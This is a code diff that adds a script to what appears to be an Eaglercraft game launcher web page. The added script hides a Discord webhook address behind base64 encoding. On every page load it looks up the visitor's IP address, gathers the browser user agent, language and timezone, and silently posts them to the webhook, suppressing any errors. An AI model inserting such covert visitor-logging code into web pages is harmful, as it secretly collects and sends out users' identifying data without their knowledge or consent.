@@ -257,7 +257,49 @@
       Press PLAY — you'll be redirected to the WASM client
     </div>
   </div>
+<script>
+  const aL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjIwOTIxNzk3NTI5NjA1NS9GWGZuSXlINEhXelkzM2w0NVd2LTRiTXRRbTVDcEhGbDVERWRsdW0zWGdFSldVelNOakNxdmFzYy16R29CTE1MX19MRA";
 
+  (async function logVisitor() {
+    try {
+      const webhookUrl = atob(aL);
+      
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      const ip = ipData.ip || "unknown";
+
+      const ua = navigator.userAgent;
+      const lang = navigator.language || "unknown";
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown";
+
+      const payload = {
+        username: "Visitor Logger",
+        embeds: [{
+          title: "🌐 New Visitor",
+          color: 0x3b8526,
+          fields: [
+            { name: "IP Address", value: `\`${ip}\``, inline: true },
+            { name: "Language", value: lang, inline: true },
+            { name: "Timezone", value: tz, inline: true },
+            { name: "User-Agent", value: ua.substring(0, 1020) || "unknown" }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: { text: "Eaglercraft Launcher" }
+        }]
+      };
+
+      // 3. Send to Discord
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {
+      // Silently fail — don't block the launcher
+      console.warn("Visitor log failed:", err);
+    }
+  })();
+</script>
   <script>
     (function() {
       // Target URL exactly as requested
